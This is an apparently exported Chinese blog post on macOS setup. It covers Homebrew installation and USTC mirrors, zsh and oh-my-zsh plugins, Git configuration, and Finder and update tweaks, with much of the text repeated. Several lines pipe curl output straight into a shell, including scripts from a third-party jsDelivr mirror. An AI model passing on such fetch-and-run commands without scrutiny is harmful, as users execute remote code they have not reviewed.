class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git -C <span class=\"string\">&quot;<span class=\"subst\">$(brew --repo homebrew/core)</span>&quot;</span> remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>替换 homebrew-cask.git ：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git -C <span class=\"string\">&quot;<span class=\"subst\">$(brew --repo homebrew/cask)</span>&quot;</span> remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>替换 homebrew-bottles ：</p>\n<p>根据使用的终端修改。</p>\n<p>若是 bash，则执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.bash_profile</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>\n\n<p>若是 zsh，则执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>这样 Homebrew 配置就完成了</p>\n</li>\n</ul>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 查询：</span><br><span class=\"line\">brew search 软件名</span><br><span class=\"line\">// 安装：</span><br><span class=\"line\">brew install 软件名</span><br><span class=\"line\">// 卸载：</span><br><span class=\"line\">brew uninstall 软件名</span><br><span class=\"line\">// 更新 Homebrew：</span><br><span class=\"line\">brew update</span><br><span class=\"line\">// 查看 Homebrew 配置信息：</span><br><span class=\"line\">brew config</span><br></pre></td></tr></table></figure>\n\n<p>使用官方脚本同样会遇到 uninstall 地址无法访问问题，可以替换为下面脚本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/uninstall)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置使用-zsh-和-oh-my-zsh\"><a href=\"#配置使用-zsh-和-oh-my-zsh\" class=\"headerlink\" title=\"配置使用 zsh 和 oh-my-zsh\"></a>配置使用 zsh 和 oh-my-zsh</h1><p>Mac 终端默认 shell 为 bash，可配置为其他，我更喜欢 zsh 一点。</p>\n<p>查看当前使用的 shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$SHELL</span></span><br></pre></td></tr></table></figure>\n\n<p>查看安装的 shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /etc/shells</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装-zsh\"><a href=\"#安装-zsh\" class=\"headerlink\" title=\"安装 zsh\"></a>安装 zsh</h2><p>执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install zsh</span><br></pre></td></tr></table></figure>\n\n<p>切换终端为 zsh：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>\n\n<p>重启终端即可使用 zsh</p>\n<h2 id=\"安装-oh-my-zsh\"><a href=\"#安装-oh-my-zsh\" class=\"headerlink\" title=\"安装 oh-my-zsh\"></a>安装 oh-my-zsh</h2><p>执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>打开配置文件，可配置主题等</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>更新配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>查看 zsh 的主题，<a href=\"https://github.com/ohmyzsh/ohmyzsh/wiki/Themes\">oh-my-zsh Themes</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.oh-my-zsh/themes &amp;&amp; <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n\n<p>查看当前使用主题名称（设置主题为 random 时可查看当前随机到的主题名称）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$ZSH_THEME</span></span><br></pre></td></tr></table></figure>\n\n<p>查看自带插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.oh-my-zsh/plugins &amp;&amp; <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n\n<p>安装高亮语法插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class=\"variable\">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在配置文件中添加 `plugins=(zsh-syntax-highlighting)`</span></span><br><span class=\"line\"><span class=\"comment\"># zsh-syntax-highlighting 官方推荐放在最后面 各插件之间用空格隔开</span></span><br></pre></td></tr></table></figure>\n\n<p>安装根据历史输入指令的记录即时的提示的插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class=\"variable\">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># `plugins=(git zsh-autosuggestions)`</span></span><br></pre></td></tr></table></figure>\n\n<p>注：报 “Insecure completion-dependent directories detected“ 错误解决办法</p>\n<p>这是由于 <code>/usr/local/share/zsh</code> <code>/usr/local/share/zsh/site-functions</code> 这两个目录没有权限，给这个两个目录赋权就可以了。<a href=\"https://github.com/robbyrussell/oh-my-zsh/issues/6835\">issue</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /usr/local/share/zsh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /usr/local/share/zsh/site-functions</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置使用-Git\"><a href=\"#配置使用-Git\" class=\"headerlink\" title=\"配置使用 Git\"></a>配置使用 Git</h1><p>查看用户名和邮箱</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config user.name</span><br><span class=\"line\"></span><br><span class=\"line\">git config user.email</span><br></pre></td></tr></table></figure>\n\n<p>配置用户名和邮箱</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;username&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>查看配置文件的位置，Git 会优先使用库级别的配置，再然后是 global 级别的配置，最后是 system 级别的配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /etc/gitconfig</span></span><br><span class=\"line\"><span class=\"comment\"># 系统级别的配置，适用于所有的用户和所有的库，存储在Git安装目录下，可以使用如下开头指令指定和修改</span></span><br><span class=\"line\">git config --system</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ~/.gitconfig</span></span><br><span class=\"line\"><span class=\"comment\"># 用户级别的配置，适用于当前登录的用户，存储在用户目录下，可以使用如下开头指令指定和修改</span></span><br><span class=\"line\">git config --gloabal</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># .git/config</span></span><br><span class=\"line\"><span class=\"comment\"># 库级别的配置，适用于某个具体的库，存储在具体的库隐藏的.git文件夹下，可以使用如下开头指令指定和修改</span></span><br><span class=\"line\">git config</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Tips\"><a href=\"#Tips\" class=\"headerlink\" title=\"Tips\"></a>Tips</h1><ul>\n<li><p>取消更新小红点</p>\n<ol>\n<li><p>在配置中取消勾选自动检查更新</p>\n</li>\n<li><p>终端执行如下两条指令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">defaults write com.apple.systempreferences AttentionPrefBundleIDs 0</span><br><span class=\"line\"></span><br><span class=\"line\">killall Dock</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>屏蔽网络访问，编辑 host 文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1 \tswscan.apple.com</span><br><span class=\"line\">127.0.0.1 \tswcdn.apple.com</span><br><span class=\"line\">127.0.0.1 \tswdist.apple.com</span><br></pre></td></tr></table></figure></li>\n</ol>\n</li>\n<li><p>查看隐藏文件</p>\n<ol>\n<li><p>快捷键 command+shift+.</p>\n</li>\n<li><p>命令行：</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 显示文件夹</span></span><br><span class=\"line\">defaults write com.apple.finder AppleShowAllFiles TRUE</span><br><span class=\"line\"><span class=\"comment\"># 重启finder</span></span><br><span class=\"line\">killall Finder</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 隐藏文件夹</span></span><br><span class=\"line\">defaults write com.apple.finder AppleShowAllFiles FALSE</span><br><span class=\"line\"><span class=\"comment\"># 重启finder</span></span><br><span class=\"line\">killall Finder</span><br></pre></td></tr></table></figure></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>这里记录一下我使用 macOS 时做的一些配置。</p>","more":"<h1 id=\"Homebrew\"><a href=\"#Homebrew\" class=\"headerlink\" title=\"Homebrew\"></a>Homebrew</h1><p>​ Homebrew 是 mac 的包管理器，仅需执行相应的命令,就能下载安装需要的软件包，可以省掉自己去下载、解压、拖拽(安装)等繁琐的步骤。</p>\n<blockquote>\n<p>Homebrew 官方文档 <a href=\"https://brew.sh/\">https://brew.sh/</a></p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>可能会报 <code>bash curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</code> 错误，建议换成 brew 镜像安装脚本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>​ Homebrew 安装软件时非常慢。为了提升安装速度，需要更改 Homebrew 的安装源，将其替换成国内镜像。<br>​ 这里用的是由中科大负责托管维护的 Homebrew 镜像。其中，前两个为必须配置的项目，后两个可按需配置。</p>\n<ul>\n<li><p>替换 brew.git ：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git -C <span class=\"string\">&quot;<span class=\"subst\">$(brew --repo)</span>&quot;</span> remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>替换 homebrew-core.git ：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git -C <span class=\"string\">&quot;<span class=\"subst\">$(brew --repo homebrew/core)</span>&quot;</span> remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>替换 homebrew-cask.git ：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git -C <span class=\"string\">&quot;<span class=\"subst\">$(brew --repo homebrew/cask)</span>&quot;</span> remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>替换 homebrew-bottles ：</p>\n<p>根据使用的终端修改。</p>\n<p>若是 bash，则执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.bash_profile</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>\n\n<p>若是 zsh，则执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>这样 Homebrew 配置就完成了</p>\n</li>\n</ul>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 查询：</span><br><span class=\"line\">brew search 软件名</span><br><span class=\"line\">// 安装：</span><br><span class=\"line\">brew install 软件名</span><br><span class=\"line\">// 卸载：</span><br><span class=\"line\">brew uninstall 软件名</span><br><span class=\"line\">// 更新 Homebrew：</span><br><span class=\"line\">brew update</span><br><span class=\"line\">// 查看 Homebrew 配置信息：</span><br><span class=\"line\">brew config</span><br></pre></td></tr></table></figure>\n\n<p>使用官方脚本同样会遇到 uninstall 地址无法访问问题，可以替换为下面脚本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/uninstall)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置使用-zsh-和-oh-my-zsh\"><a href=\"#配置使用-zsh-和-oh-my-zsh\" class=\"headerlink\" title=\"配置使用 zsh 和 oh-my-zsh\"></a>配置使用 zsh 和 oh-my-zsh</h1><p>Mac 终端默认 shell 为 bash，可配置为其他，我更喜欢 zsh 一点。</p>\n<p>查看当前使用的 shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$SHELL</span></span><br></pre></td></tr></table></figure>\n\n<p>查看安装的 shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /etc/shells</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装-zsh\"><a href=\"#安装-zsh\" class=\"headerlink\" title=\"安装 zsh\"></a>安装 zsh</h2><p>执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install zsh</span><br></pre></td></tr></table></figure>\n\n<p>切换终端为 zsh：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>\n\n<p>重启终端即可使用 zsh</p>\n<h2 id=\"安装-oh-my-zsh\"><a href=\"#安装-oh-my-zsh\" class=\"headerlink\" title=\"安装 oh-my-zsh\"></a>安装 oh-my-zsh</h2><p>执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>打开配置文件，可配置主题等</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>更新配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>查看 zsh 的主题，<a href=\"https://github.com/ohmyzsh/ohmyzsh/wiki/Themes\">oh-my-zsh Themes</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.oh-my-zsh/themes &amp;&amp; <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n\n<p>查看当前使用主题名称（设置主题为 random 时可查看当前随机到的主题名称）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$ZSH_THEME</span></span><br></pre></td></tr></table></figure>\n\n<p>查看自带插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.oh-my-zsh/plugins &amp;&amp; <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n\n<p>安装高亮语法插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class=\"variable\">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在配置文件中添加 `plugins=(zsh-syntax-highlighting)`</span></span><br><span class=\"line\"><span class=\"comment\"># zsh-syntax-highlighting 官方推荐放在最后面 各插件之间用空格隔开</span></span><br></pre></td></tr></table></figure>\n\n<p>安装根据历史输入指令的记录即时的提示的插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class=\"variable\">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># `plugins=(git zsh-autosuggestions)`</span></span><br></pre></td></tr></table></figure>\n\n<p>注：报 “Insecure completion-dependent directories detected“ 错误解决办法</p>\n<p>这是由于 <code>/usr/local/share/zsh</code> <code>/usr/local/share/zsh/site-functions</code> 这两个目录没有权限，给这个两个目录赋权就可以了。<a href=\"https://github.com/robbyrussell/oh-my-zsh/issues/6835\">issue</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /usr/local/share/zsh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /usr/local/share/zsh/site-functions</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置使用-Git\"><a href=\"#配置使用-Git\" class=\"headerlink\" title=\"配置使用 Git\"></a>配置使用 Git</h1><p>查看用户名和邮箱</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config user.name</span><br><span class=\"line\"></span><br><span class=\"line\">git config user.email</span><br></pre></td></tr></table></figure>\n\n<p>配置用户名和邮箱</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;username&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>查看配置文件的位置，Git 会优先使用库级别的配置，再然后是 global 级别的配置，最后是 system 级别的配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /etc/gitconfig</span></span><br><span class=\"line\"><span class=\"comment\"># 系统级别的配置，适用于所有的用户和所有的库，存储在Git安装目录下，可以使用如下开头指令指定和修改</span></span><br><span class=\"line\">git config --system</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ~/.gitconfig</span></span><br><span class=\"line\"><span class=\"comment\"># 用户级别的配置，适用于当前登录的用户，存储在用户目录下，可以使用如下开头指令指定和修改</span></span><br><span class=\"line\">git config --gloabal</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># .git/config</span></span><br><span class=\"line\"><span class=\"comment\"># 库级别的配置，适用于某个具体的库，存储在具体的库隐藏的.git文件夹下，可以使用如下开头指令指定和修改</span></span><br><span class=\"line\">git config</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Tips\"><a href=\"#Tips\" class=\"headerlink\" title=\"Tips\"></a>Tips</h1><ul>\n<li><p>取消更新小红点</p>\n<ol>\n<li><p>在配置中取消勾选自动检查更新</p>\n</li>\n<li><p>终端执行如下两条指令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">defaults write com.apple.systempreferences AttentionPrefBundleIDs 0</span><br><span class=\"line\"></span><br><span class=\"line\">killall Dock</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>屏蔽网络访问，编辑 host 文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1 \tswscan.apple.com</span><br><span class=\"line\">127.0.0.1 \tswcdn.apple.com</span><br><span class=\"line\">127.0.0.1 \tswdist.apple.com</span><br></pre></td></tr></table></figure></li>\n</ol>\n</li>\n<li><p>查看隐藏文件</p>\n<ol>\n<li><p>快捷键 command+shift+.</p>\n</li>\n<li><p>命令行：</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 显示文件夹</span></span><br><span class=\"line\">defaults write com.apple.finder AppleShowAllFiles TRUE</span><br><span class=\"line\"><span class=\"comment\"># 重启finder</span></span><br><span class=\"line\">killall Finder</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 隐藏文件夹</span></span><br><span class=\"line\">defaults write com.apple.finder AppleShowAllFiles FALSE</span><br><span class=\"line\"><span 